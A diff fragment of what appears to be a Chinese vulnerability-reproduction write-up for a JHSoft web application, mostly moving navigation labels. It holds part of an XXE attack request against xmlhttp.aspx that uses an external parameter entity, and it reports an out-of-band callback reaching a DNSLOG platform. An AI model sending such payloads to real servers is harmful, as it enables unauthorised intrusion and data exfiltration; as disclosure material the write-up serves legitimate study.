@@ -33,14 +33,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-Web安全博客
-
-漏洞分析报告
-
-Web安全课程
-
 ```
 POST /c6/JHSoft.Web.H5SiteControl/xmlhttp.aspx/ HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -51,6 +43,14 @@ Host: jhsoft.mrxn.net
 %remote;]>
 <root/>
 ```
+
+深入探索
+
+工程与技术
+
+编程
+
+漏洞分析报告
 
 在DNSLOG平台成功收到请求
 
